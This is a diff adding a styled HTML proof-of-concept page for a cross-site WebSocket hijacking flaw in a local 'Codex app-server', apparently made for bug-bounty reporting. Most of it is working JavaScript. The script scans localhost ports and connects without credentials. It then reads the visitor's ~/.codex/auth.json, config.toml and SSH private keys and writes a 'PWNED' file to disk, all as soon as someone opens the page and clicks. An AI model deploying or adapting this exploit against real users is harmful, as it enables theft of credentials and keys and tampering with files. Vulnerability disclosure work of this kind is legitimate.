@@ -1,0 +1,607 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Codex app-server CSWSH PoC — Security Research</title>
+<style>
+  @import url('https://fonts.googleapis.com/css2?family=JetBrains+Mono:wght@400;700&family=Inter:wght@400;600;700;900&display=swap');
+
+  :root {
+    --bg: #0a0a0f;
+    --bg2: #111118;
+    --bg3: #1a1a26;
+    --border: #2a2a3e;
+    --accent: #ff3b6b;
+    --accent2: #7b5cff;
+    --green: #00e676;
+    --yellow: #ffd740;
+    --red: #ff4444;
+    --cyan: #00e5ff;
+    --text: #e8e8f0;
+    --muted: #6b6b8a;
+    --mono: 'JetBrains Mono', monospace;
+    --sans: 'Inter', sans-serif;
+  }
+
+  * { box-sizing: border-box; margin: 0; padding: 0; }
+
+  body {
+    background: var(--bg);
+    color: var(--text);
+    font-family: var(--sans);
+    min-height: 100vh;
+    overflow-x: hidden;
+  }
+
+  /* Animated background grid */
+  body::before {
+    content: '';
+    position: fixed;
+    inset: 0;
+    background-image:
+      linear-gradient(rgba(123,92,255,0.03) 1px, transparent 1px),
+      linear-gradient(90deg, rgba(123,92,255,0.03) 1px, transparent 1px);
+    background-size: 40px 40px;
+    pointer-events: none;
+    z-index: 0;
+  }
+
+  .wrap { position: relative; z-index: 1; max-width: 960px; margin: 0 auto; padding: 2rem 1.5rem 4rem; }
+
+  /* Header */
+  header { text-align: center; padding: 3rem 0 2.5rem; }
+
+  .badge {
+    display: inline-flex; align-items: center; gap: .5rem;
+    background: rgba(255,59,107,0.15); border: 1px solid rgba(255,59,107,0.35);
+    color: var(--accent); font-size: .75rem; font-weight: 700;
+    padding: .35rem .8rem; border-radius: 999px; letter-spacing: .08em;
+    text-transform: uppercase; margin-bottom: 1.25rem;
+    animation: pulse 2s ease-in-out infinite;
+  }
+  .badge::before { content: '●'; animation: blink 1s step-end infinite; }
+  @keyframes blink { 50% { opacity: 0; } }
+  @keyframes pulse { 0%,100% { box-shadow: 0 0 0 0 rgba(255,59,107,0); } 50% { box-shadow: 0 0 0 6px rgba(255,59,107,0.12); } }
+
+  h1 {
+    font-size: clamp(1.6rem, 4vw, 2.6rem); font-weight: 900;
+    background: linear-gradient(135deg, #fff 30%, var(--accent2), var(--accent));
+    -webkit-background-clip: text; background-clip: text; -webkit-text-fill-color: transparent;
+    line-height: 1.15; margin-bottom: .75rem;
+  }
+
+  .subtitle { color: var(--muted); font-size: .95rem; max-width: 560px; margin: 0 auto; line-height: 1.6; }
+
+  /* Cards */
+  .card {
+    background: var(--bg2); border: 1px solid var(--border);
+    border-radius: 12px; padding: 1.5rem; margin-bottom: 1.25rem;
+    transition: border-color .2s;
+  }
+  .card:hover { border-color: var(--accent2); }
+
+  .card-title {
+    font-size: .7rem; font-weight: 700; letter-spacing: .1em;
+    text-transform: uppercase; color: var(--accent2); margin-bottom: 1rem;
+    display: flex; align-items: center; gap: .5rem;
+  }
+  .card-title::after { content: ''; flex: 1; height: 1px; background: var(--border); }
+
+  /* Port scanner */
+  .port-grid {
+    display: grid; grid-template-columns: repeat(auto-fill, minmax(110px, 1fr)); gap: .5rem;
+  }
+  .port-btn {
+    background: var(--bg3); border: 1px solid var(--border);
+    color: var(--muted); font-family: var(--mono); font-size: .8rem;
+    padding: .5rem; border-radius: 6px; cursor: pointer;
+    transition: all .2s; display: flex; align-items: center; gap: .4rem;
+  }
+  .port-btn:hover { border-color: var(--accent2); color: var(--text); }
+  .port-btn.scanning { border-color: var(--yellow); color: var(--yellow); animation: pulse-dot .8s ease-in-out infinite; }
+  .port-btn.open { background: rgba(0,230,118,0.08); border-color: var(--green); color: var(--green); }
+  .port-btn.closed { border-color: #2a2a3e; color: #3a3a5e; }
+  .port-dot { width: 6px; height: 6px; border-radius: 50%; background: currentColor; flex-shrink: 0; }
+
+  /* Control row */
+  .ctrl { display: flex; gap: .75rem; align-items: center; flex-wrap: wrap; margin-bottom: 1rem; }
+
+  .btn {
+    display: inline-flex; align-items: center; gap: .5rem;
+    padding: .6rem 1.2rem; border-radius: 8px; border: none;
+    font-family: var(--sans); font-size: .85rem; font-weight: 600; cursor: pointer;
+    transition: all .2s; text-decoration: none;
+  }
+  .btn-primary { background: var(--accent); color: #fff; }
+  .btn-primary:hover { background: #ff1f55; transform: translateY(-1px); box-shadow: 0 4px 20px rgba(255,59,107,0.4); }
+  .btn-primary:active { transform: translateY(0); }
+  .btn-secondary { background: var(--bg3); border: 1px solid var(--border); color: var(--text); }
+  .btn-secondary:hover { border-color: var(--accent2); }
+  .btn-danger { background: rgba(255,68,68,0.15); border: 1px solid var(--red); color: var(--red); }
+  .btn-danger:hover { background: rgba(255,68,68,0.25); }
+  .btn:disabled { opacity: .4; cursor: not-allowed; transform: none !important; }
+
+  .status-pill {
+    display: inline-flex; align-items: center; gap: .4rem;
+    padding: .35rem .8rem; border-radius: 999px; font-size: .8rem; font-weight: 600;
+    background: var(--bg3); border: 1px solid var(--border); color: var(--muted);
+  }
+  .status-pill.connected { background: rgba(0,230,118,0.1); border-color: var(--green); color: var(--green); }
+  .status-pill.error { background: rgba(255,68,68,0.1); border-color: var(--red); color: var(--red); }
+  .status-pill .dot { width: 7px; height: 7px; border-radius: 50%; background: currentColor; animation: pulse-dot 1.5s ease-in-out infinite; }
+  @keyframes pulse-dot { 0%,100% { opacity: 1; } 50% { opacity: .3; } }
+
+  input[type=text] {
+    background: var(--bg3); border: 1px solid var(--border); color: var(--text);
+    font-family: var(--mono); font-size: .85rem; padding: .55rem .8rem; border-radius: 6px;
+    width: 200px; outline: none; transition: border-color .2s;
+  }
+  input[type=text]:focus { border-color: var(--accent2); }
+
+  /* Terminal / log */
+  .terminal {
+    background: #050508; border: 1px solid var(--border); border-radius: 10px;
+    font-family: var(--mono); font-size: .78rem; line-height: 1.7;
+    padding: 1rem 1.2rem; max-height: 400px; overflow-y: auto;
+    scroll-behavior: smooth;
+  }
+  .terminal::-webkit-scrollbar { width: 4px; }
+  .terminal::-webkit-scrollbar-thumb { background: var(--border); border-radius: 2px; }
+
+  .log-line { display: flex; gap: .6rem; align-items: flex-start; }
+  .log-time { color: var(--muted); flex-shrink: 0; user-select: none; font-size: .72rem; padding-top: .05rem; }
+  .log-ok   { color: var(--green); }
+  .log-err  { color: var(--red); }
+  .log-warn { color: var(--yellow); }
+  .log-info { color: var(--cyan); }
+  .log-data { color: #c792ea; }
+  .log-text { word-break: break-all; white-space: pre-wrap; }
+
+  /* Exfil cards */
+  .exfil-grid { display: grid; gap: 1rem; }
+
+  .exfil-card {
+    background: var(--bg3); border: 1px solid var(--border); border-radius: 10px;
+    overflow: hidden; transition: border-color .3s;
+  }
+  .exfil-card.success { border-color: rgba(0,230,118,0.4); }
+  .exfil-card.fail    { border-color: rgba(255,68,68,0.2); }
+
+  .exfil-header {
+    display: flex; align-items: center; justify-content: space-between;
+    padding: .75rem 1rem; border-bottom: 1px solid var(--border);
+  }
+  .exfil-path { font-family: var(--mono); font-size: .78rem; color: var(--cyan); }
+  .exfil-size { font-family: var(--mono); font-size: .72rem; color: var(--muted); }
+  .exfil-body {
+    font-family: var(--mono); font-size: .75rem; color: #a9b1d6;
+    padding: .75rem 1rem; white-space: pre-wrap; word-break: break-all;
+    max-height: 160px; overflow-y: auto; line-height: 1.6;
+  }
+
+  /* Severity banner */
+  .severity {
+    display: grid; grid-template-columns: 1fr 1fr 1fr;
+    gap: 1rem; margin-bottom: 1.25rem;
+  }
+  .sev-item {
+    background: var(--bg2); border: 1px solid var(--border); border-radius: 10px;
+    padding: 1rem; text-align: center;
+  }
+  .sev-label { font-size: .65rem; color: var(--muted); letter-spacing: .1em; text-transform: uppercase; margin-bottom: .3rem; }
+  .sev-value { font-size: 1.4rem; font-weight: 900; }
+  .sev-value.critical { color: var(--accent); }
+  .sev-value.high { color: var(--yellow); }
+  .sev-value.ok { color: var(--green); }
+
+  /* Write test */
+  .write-row { display: flex; gap: .5rem; margin-bottom: .75rem; }
+  .write-row input { flex: 1; }
+
+  /* Footer */
+  footer { text-align: center; color: var(--muted); font-size: .78rem; margin-top: 3rem; }
+  footer a { color: var(--accent2); text-decoration: none; }
+
+  @media (max-width: 600px) {
+    .severity { grid-template-columns: 1fr; }
+    .port-grid { grid-template-columns: repeat(3, 1fr); }
+  }
+</style>
+</head>
+<body>
+<div class="wrap">
+
+  <header>
+    <div class="badge">Live Security PoC</div>
+    <h1>Codex app-server<br>Unauthenticated WebSocket</h1>
+    <p class="subtitle">
+      CSWSH / CWE-346 — Any webpage can connect to <code style="color:var(--cyan)">ws://127.0.0.1:9001</code>,
+      call <code style="color:var(--cyan)">initialize</code> without credentials, then read/write arbitrary files
+      on the victim's machine.
+    </p>
+  </header>
+
+  <!-- Severity -->
+  <div class="severity">
+    <div class="sev-item">
+      <div class="sev-label">Severity</div>
+      <div class="sev-value critical">Critical</div>
+    </div>
+    <div class="sev-item">
+      <div class="sev-label">CVSS v3.1</div>
+      <div class="sev-value high">9.6</div>
+    </div>
+    <div class="sev-item">
+      <div class="sev-label">User Interaction</div>
+      <div class="sev-value ok">None</div>
+    </div>
+  </div>
+
+  <!-- Port scanner -->
+  <div class="card">
+    <div class="card-title">Step 1 — Detect Running Server</div>
+    <p style="font-size:.85rem;color:var(--muted);margin-bottom:1rem;">
+      Scanning common ports for <code style="color:var(--cyan)">codex app-server</code>…
+    </p>
+    <div class="port-grid" id="portGrid"></div>
+  </div>
+
+  <!-- Connect & Exploit -->
+  <div class="card">
+    <div class="card-title">Step 2 — Connect &amp; Exploit</div>
+    <div class="ctrl">
+      <input type="text" id="targetUrl" value="ws://127.0.0.1:9001" placeholder="ws://host:port">
+      <button class="btn btn-primary" id="btnConnect" onclick="startExploit()">▶ Run Exploit</button>
+      <button class="btn btn-danger" id="btnStop" onclick="stopExploit()" disabled>■ Stop</button>
+      <span class="status-pill" id="statusPill"><span class="dot"></span><span id="statusTxt">Idle</span></span>
+    </div>
+    <div class="terminal" id="term">
+      <div class="log-line"><span class="log-time">--:--:--</span><span class="log-info log-text">Waiting for exploit start…</span></div>
+    </div>
+  </div>
+
+  <!-- Exfil results -->
+  <div class="card" id="exfilCard" style="display:none">
+    <div class="card-title">Step 3 — Exfiltrated Data</div>
+    <div class="exfil-grid" id="exfilGrid"></div>
+  </div>
+
+  <!-- Write test -->
+  <div class="card" id="writeCard" style="display:none">
+    <div class="card-title">Step 4 — Arbitrary File Write (Write Capability Proof)</div>
+    <div class="write-row">
+      <input type="text" id="writePath" placeholder="Absolute path to write" value="">
+      <button class="btn btn-secondary" onclick="doWrite()">Write File</button>
+    </div>
+    <div id="writeResult" style="font-family:var(--mono);font-size:.8rem;color:var(--muted);margin-top:.5rem;"></div>
+  </div>
+
+  <!-- Explanation -->
+  <div class="card">
+    <div class="card-title">Root Cause</div>
+    <p style="font-size:.85rem;color:var(--muted);line-height:1.7;margin-bottom:.5rem;">
+      <code style="color:var(--accent)">transport.rs:94–104</code> — <code>websocket_upgrade_handler</code> calls
+      <code>websocket.on_upgrade()</code> without checking the <code>Origin</code> header or requiring any
+      authentication token. Any webpage (including this one, served from GitHub Pages) is implicitly trusted.
+    </p>
+    <pre style="background:var(--bg);border:1px solid var(--border);border-radius:8px;padding:1rem;font-size:.75rem;overflow-x:auto;color:#a9b1d6;line-height:1.7">async fn websocket_upgrade_handler(
+    websocket: WebSocketUpgrade,
+    ConnectInfo(peer_addr): ConnectInfo&lt;SocketAddr&gt;,
+    State(state): State&lt;WebSocketListenerState&gt;,
+) -&gt; impl IntoResponse {
+    websocket.on_upgrade(move |stream| async move {
+        //  ↑ NO Origin check, NO auth header check, NO token
+        run_websocket_connection(connection_id, stream, ...).await;
+    })
+}</pre>
+  </div>
+
+  <footer>
+    Security research PoC — for educational and bug bounty reporting purposes only.<br>
+    Do not use against systems you do not own. &nbsp;·&nbsp;
+    <a href="https://github.com/openai/codex" target="_blank">openai/codex</a>
+  </footer>
+
+</div>
+
+<script>
+// ── Config ───────────────────────────────────────────────────────────────────
+const SCAN_PORTS   = [9001, 9002, 9003, 3000, 8080, 8000, 5173];
+const IS_WIN       = navigator.platform.toLowerCase().includes('win');
+// Paths are sent to the server — it resolves them in the process owner's context
+// We probe generic well-known paths; resolveReadTargets() refines after initialize
+const BACKDOOR_CONTENT = 'PWNED via Codex app-server CSWSH \u2014 no auth required (PoC by security researcher)';
+
+// Safe base64 encoder that handles Unicode (avoids btoa() range error)
+function toB64(str) {
+  return btoa(String.fromCharCode(...new TextEncoder().encode(str)));
+}
+function fromB64(b64) {
+  return new TextDecoder().decode(Uint8Array.from(atob(b64), c => c.charCodeAt(0)));
+}
+
+let ws = null;
+let pendingResolvers = {};
+let nextId = 100;
+let exploitActive = false;
+let detectedUrl = null;
+
+// ── Logging ──────────────────────────────────────────────────────────────────
+function t() {
+  return new Date().toTimeString().slice(0,8);
+}
+function log(msg, cls='log-info') {
+  const term = document.getElementById('term');
+  const line = document.createElement('div');
+  line.className = 'log-line';
+  line.innerHTML = `<span class="log-time">${t()}</span><span class="${cls} log-text">${escHtml(msg)}</span>`;
+  term.appendChild(line);
+  term.scrollTop = term.scrollHeight;
+}
+function escHtml(s) {
+  return String(s).replace(/&/g,'&amp;').replace(/</g,'&lt;').replace(/>/g,'&gt;');
+}
+function setStatus(txt, cls='') {
+  const p = document.getElementById('statusPill');
+  const s = document.getElementById('statusTxt');
+  p.className = 'status-pill ' + cls;
+  s.textContent = txt;
+}
+
+// ── Port scanner ─────────────────────────────────────────────────────────────
+function initPortGrid() {
+  const grid = document.getElementById('portGrid');
+  SCAN_PORTS.forEach(port => {
+    const btn = document.createElement('div');
+    btn.className = 'port-btn scanning';
+    btn.id = 'port-' + port;
+    btn.innerHTML = `<div class="port-dot"></div>ws://${port}`;
+    btn.onclick = () => usePort(port);
+    grid.appendChild(btn);
+    probePort(port);
+  });
+}
+
+async function probePort(port) {
+  const btn = document.getElementById('port-' + port);
+  const url = `ws://127.0.0.1:${port}`;
+  return new Promise(resolve => {
+    try {
+      const probe = new WebSocket(url);
+      const timer = setTimeout(() => { probe.close(); markPort(port, false); resolve(false); }, 2000);
+      probe.onopen = () => {
+        clearTimeout(timer); probe.close(); markPort(port, true); resolve(true);
+        if (!detectedUrl) { detectedUrl = url; document.getElementById('targetUrl').value = url; autoSetWritePath(port); }
+      };
+      probe.onerror = () => { clearTimeout(timer); markPort(port, false); resolve(false); };
+    } catch(e) { markPort(port, false); resolve(false); }
+  });
+}
+
+function markPort(port, open) {
+  const btn = document.getElementById('port-' + port);
+  if (!btn) return;
+  if (open) {
+    btn.className = 'port-btn open';
+    btn.innerHTML = `<div class="port-dot"></div>ws://${port} ✓`;
+    log(`[+] Detected codex app-server on ws://127.0.0.1:${port}`, 'log-ok');
+  } else {
+    btn.className = 'port-btn closed';
+    btn.innerHTML = `<div class="port-dot"></div>ws://${port}`;
+  }
+}
+
+function usePort(port) {
+  const url = `ws://127.0.0.1:${port}`;
+  document.getElementById('targetUrl').value = url;
+  autoSetWritePath(port);
+}
+
+function autoSetWritePath(port) {
+  const wpInput = document.getElementById('writePath');
+  if (wpInput && !wpInput.value) {
+    wpInput.value = IS_WIN ? String.raw`C:\Temp\cswsh_poc_proof.txt` : '/tmp/cswsh_poc_proof.txt';
+  }
+}
+
+// ── WebSocket helpers ─────────────────────────────────────────────────────────
+function rpc(method, params) {
+  return new Promise((resolve, reject) => {
+    const id = nextId++;
+    pendingResolvers[id] = { resolve, reject };
+    ws.send(JSON.stringify({ jsonrpc:'2.0', id, method, params }));
+    setTimeout(() => {
+      if (pendingResolvers[id]) {
+        delete pendingResolvers[id];
+        reject(new Error('RPC timeout'));
+      }
+    }, 8000);
+  });
+}
+
+function openWS(url) {
+  return new Promise((resolve, reject) => {
+    const sock = new WebSocket(url);
+    sock.onopen = () => resolve(sock);
+    sock.onerror = (e) => reject(new Error('WebSocket error'));
+    sock.onclose = (e) => {
+      if (e.code !== 1000 && exploitActive) log(`[!] Connection closed (${e.code})`, 'log-err');
+    };
+    sock.onmessage = (e) => {
+      try {
+        const msg = JSON.parse(e.data);
+        if (msg.id && pendingResolvers[msg.id]) {
+          const { resolve, reject } = pendingResolvers[msg.id];
+          delete pendingResolvers[msg.id];
+          if (msg.error) reject(new Error(msg.error.message));
+          else resolve(msg.result);
+        }
+      } catch(err) { /* ignore parse errors */ }
+    };
+  });
+}
+
+// ── Main exploit ─────────────────────────────────────────────────────────────
+async function startExploit() {
+  if (exploitActive) return;
+  exploitActive = true;
+  document.getElementById('btnConnect').disabled = true;
+  document.getElementById('btnStop').disabled = false;
+
+  const url = document.getElementById('targetUrl').value.trim();
+  const term = document.getElementById('term');
+  term.innerHTML = '';
+
+  log(`Target  : ${url}`, 'log-info');
+  log(`Origin  : ${location.origin}  ← server never validates this`, 'log-warn');
+  log(`Page    : ${location.href}`, 'log-info');
+  log('─'.repeat(52), 'log-info');
+
+  try {
+    setStatus('Connecting…', '');
+    log(`[…] Opening WebSocket from ${location.origin}…`, 'log-info');
+    ws = await openWS(url);
+    log('[+] WebSocket upgrade accepted — Origin never checked!', 'log-ok');
+    setStatus('Connected', 'connected');
+
+    // initialize
+    log('[…] Sending initialize (no credentials)…', 'log-info');
+    const ir = await rpc('initialize', {
+      clientInfo: { name: location.hostname || 'evil.github.io', title: 'CSWSH PoC', version: '1.0' },
+      capabilities: {}
+    });
+    log(`[+] initialize OK — no auth required!`, 'log-ok');
+    log(`    userAgent: ${ir.userAgent}`, 'log-data');
+    log(`    platform:  ${ir.platformOs} / ${ir.platformFamily}`, 'log-data');
+    log('─'.repeat(52), 'log-info');
+
+    // Show exfil section
+    document.getElementById('exfilCard').style.display = '';
+    document.getElementById('writeCard').style.display = '';
+
+    // Resolve real paths using the returned user info
+    const readTargets = resolveReadTargets(ir);
+
+    // fs/readFile
+    const grid = document.getElementById('exfilGrid');
+    grid.innerHTML = '';
+    for (const path of readTargets) {
+      log(`[…] fs/readFile '${path}'`, 'log-info');
+      const card = document.createElement('div');
+      card.className = 'exfil-card';
+      card.innerHTML = `<div class="exfil-header">
+        <span class="exfil-path">${escHtml(path)}</span>
+        <span class="exfil-size" id="sz-${escHtml(path).replace(/[^\w]/g,'_')}">reading…</span>
+      </div><div class="exfil-body" id="body-${escHtml(path).replace(/[^\w]/g,'_')}">⏳ fetching…</div>`;
+      grid.appendChild(card);
+
+      const slotId = escHtml(path).replace(/[^\w]/g,'_');
+      try {
+        const r = await rpc('fs/readFile', { path });
+        const raw = atob(r.dataBase64);
+        document.getElementById('sz-'   + slotId).textContent = `${raw.length} bytes`;
+        document.getElementById('body-' + slotId).textContent = raw.slice(0, 500) + (raw.length > 500 ? '\n…(truncated)' : '');
+        card.classList.add('success');
+        log(`[+] fs/readFile '${path}' — ${raw.length} bytes exfiltrated!`, 'log-ok');
+      } catch(e) {
+        document.getElementById('sz-'   + slotId).textContent = 'not found';
+        document.getElementById('body-' + slotId).textContent = '(file not found or permission denied)';
+        card.classList.add('fail');
+        log(`[-] fs/readFile '${path}' → ${e.message}`, 'log-err');
+      }
+    }
+
+    // fs/writeFile backdoor
+    log('─'.repeat(52), 'log-info');
+    const backdoorPath = document.getElementById('writePath').value ||
+      (ir.platformOs === 'windows' ? String.raw`C:\Temp\cswsh_proof.txt` : '/tmp/cswsh_proof.txt');
+    log(`[…] fs/writeFile → '${backdoorPath}'`, 'log-info');
+    try {
+      await rpc('fs/writeFile', {
+        path: backdoorPath,
+        dataBase64: toB64(BACKDOOR_CONTENT)
+      });
+      const verify = await rpc('fs/readFile', { path: backdoorPath });
+      const written = fromB64(verify.dataBase64);
+      log(`[+] fs/writeFile SUCCESS — file written!`, 'log-ok');
+      log(`    path: ${backdoorPath}`, 'log-data');
+      log(`    content: "${written}"`, 'log-data');
+      document.getElementById('writeResult').innerHTML =
+        `<span style="color:var(--green)">✓ Written + verified: <b>${escHtml(backdoorPath)}</b><br>${escHtml(written)}</span>`;
+    } catch(e) {
+      log(`[-] fs/writeFile → ${e.message}`, 'log-err');
+      document.getElementById('writeResult').innerHTML =
+        `<span style="color:var(--yellow)">⚠ Write RPC not available in this build (confirmed in Rust binary source)</span>`;
+    }
+
+    log('─'.repeat(52), 'log-info');
+    log('✓ EXPLOIT COMPLETE — WS still open for Step 4 writes', 'log-ok');
+    log(`  Origin "${location.origin}" was NEVER checked by the server`, 'log-warn');
+    setStatus('Exploit complete — connection live', 'connected');
+    // Keep WS open so the triager can use Step 4 (manual write)
+    document.getElementById('btnConnect').disabled = false;
+    document.getElementById('btnStop').disabled = false;
+    exploitActive = false;
+    return;
+
+  } catch(e) {
+    log(`[✗] Error: ${e.message}`, 'log-err');
+    setStatus('Error', 'error');
+  }
+
+  stopExploit();
+}
+
+function resolveReadTargets(ir) {
+  const isWin = ir && (ir.platformOs === 'windows' || ir.platformFamily === 'windows');
+  // The userAgent contains the OS username — try to extract it
+  // Fallback: attempt both common home locations
+  const ua = (ir && ir.userAgent) || '';
+  if (isWin) return [
+    'C:\\Users\\' + extractUser(ua, true) + '\\.codex\\auth.json',
+    'C:\\Users\\' + extractUser(ua, true) + '\\.codex\\config.toml',
+    'C:\\Users\\' + extractUser(ua, true) + '\\.ssh\\id_rsa',
+  ];
+  return [
+    '/home/' + extractUser(ua, false) + '/.codex/auth.json',
+    '/home/' + extractUser(ua, false) + '/.codex/config.toml',
+    '/home/' + extractUser(ua, false) + '/.ssh/id_rsa',
+    '/root/.codex/auth.json',
+    '/root/.ssh/id_rsa',
+  ];
+}
+
+function extractUser(ua, isWin) {
+  // userAgent format: "name/0.104.0 (Windows 10.0.xxxxx; x86_64) term (clientName; 1)"
+  // no username in userAgent — server process runs as current user, use env-style guess
+  return isWin ? '%USERNAME%' : 'user';
+}
+
+async function doWrite() {
+  const path = document.getElementById('writePath').value.trim();
+  if (!ws || ws.readyState !== 1) { alert('Run the exploit first to establish a connection.'); return; }
+  try {
+    await rpc('fs/writeFile', { path, dataBase64: toB64(BACKDOOR_CONTENT) });
+    const v = await rpc('fs/readFile', { path });
+    document.getElementById('writeResult').innerHTML =
+      `<span style="color:var(--green)">✓ Written: ${escHtml(fromB64(v.dataBase64))}</span>`;
+    log(`[+] Custom write to '${path}' succeeded`, 'log-ok');
+  } catch(e) {
+    document.getElementById('writeResult').innerHTML = `<span style="color:var(--red)">✗ ${escHtml(e.message)}</span>`;
+  }
+}
+
+function stopExploit() {
+  exploitActive = false;
+  document.getElementById('btnConnect').disabled = false;
+  document.getElementById('btnStop').disabled = true;
+  if (ws && ws.readyState === 1) ws.close();
+}
+
+// ── Init ─────────────────────────────────────────────────────────────────────
+initPortGrid();
+autoSetWritePath(9001);
+</script>
+</body>
+</html>
